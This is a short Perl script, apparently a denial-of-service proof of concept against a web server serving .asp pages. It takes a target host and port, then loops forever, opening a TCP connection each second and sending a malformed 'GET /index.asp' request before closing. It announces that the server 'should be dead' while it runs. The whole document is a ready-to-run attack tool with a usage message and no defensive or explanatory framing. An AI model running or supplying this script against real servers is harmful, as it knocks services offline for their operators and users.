#!/usr/bin/perl
use Socket;

(($target = $ARGV[0]) && ($port = $ARGV[1])) || die "Usage: $0 ",
"<target> <port> \n";

print "\nThe Webserver on http://$target:$port should be dead until",
"this script is running\n";

while (1) {
$ip = inet_aton($target) || die "host($target) not found.\n";
$sockaddr = pack_sockaddr_in($port, $ip);
socket(SOCKET, PF_INET, SOCK_STREAM, 0) || die "socket error.\n";

connect(SOCKET, $sockaddr) || die "connect $target $port error.\n";

print SOCKET "GET /index.asp";
print "Request sent ...\n";

close(SOCKET);

sleep 1;

};
